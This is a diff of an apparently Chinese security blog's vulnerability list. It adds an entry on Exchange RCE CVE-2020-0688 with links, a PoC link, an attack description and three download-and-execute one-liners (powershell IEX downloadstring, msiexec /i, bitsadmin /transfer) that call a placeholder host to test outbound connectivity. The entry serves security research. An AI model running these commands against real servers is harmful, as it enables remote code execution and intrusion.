@@ -164,10 +164,23 @@ Reading time ~6 minutes
     <div class="entry-content">
       <span class="entry-tags" style="color:red;font-size:13px;margin-bottom: 0px;">「声明：本博客中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。」</span>
       <p><img src="../images/zsxq-s.png" alt="图1" height="200px" width="200px" />
-<b><center>欢迎加入知识星球</center></b></p>
+<b><center>欢迎加入知识星球，订阅最新推送</center></b></p>
 
 <h2 id="2020">2020</h2>
 <ol>
+  <li><strong>【20200226】Exchange服务器命令执行漏洞RCE CVE-2020-0688</strong>
+    <ul>
+      <li>官方公告：<a href="https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688">https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-0688</a></li>
+      <li>漏洞分析：<a href="https://nosec.org/home/detail/4158.html">https://nosec.org/home/detail/4158.html</a></li>
+      <li>PoC: <a href="https://github.com/Jumbo-WJB/CVE-2020-0688/blob/master/CVE-2020-0688.py">https://github.com/Jumbo-WJB/CVE-2020-0688/blob/master/CVE-2020-0688.py</a></li>
+      <li>注意：CU12也受影响</li>
+      <li>描述：Exchange安装时使用了静态密钥，在获取一个普通用户的登陆session之后，攻击者可以利用Exchange的静态密钥构造ViewState，从而发送恶意序列化Payload来执行命令。注意，CU12版本也受影响。攻击的目标CGI为：/ecp/default.aspx</li>
+      <li>其他：一般Exchange服务器部署在内网，可以通过ping、nslookup等命令利用dnslog探测。如果有外网的话，可以使用powershell、msiexec、bitsadmin、telnet等命令进行外连探测，不过bitsadmin、powershell、msiexec等容易被拦截或检测。</li>
+      <li>powershell.exe -nop -c “IEX ((new-object net.webclient).downloadstring(‘http://example.com/test’))”</li>
+      <li>msiexec /q /i http://example.com/test</li>
+      <li>bitsadmin /transfer n http://example.com/test C:\test</li>
+    </ul>
+  </li>
   <li><strong>【20200220】Tomcat AJP文件包含漏洞CVE-2020-1938</strong>
     <ul>
       <li>漏洞分析：<a href="https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ">https://mp.weixin.qq.com/s/GzqLkwlIQi_i3AVIXn59FQ</a></li>
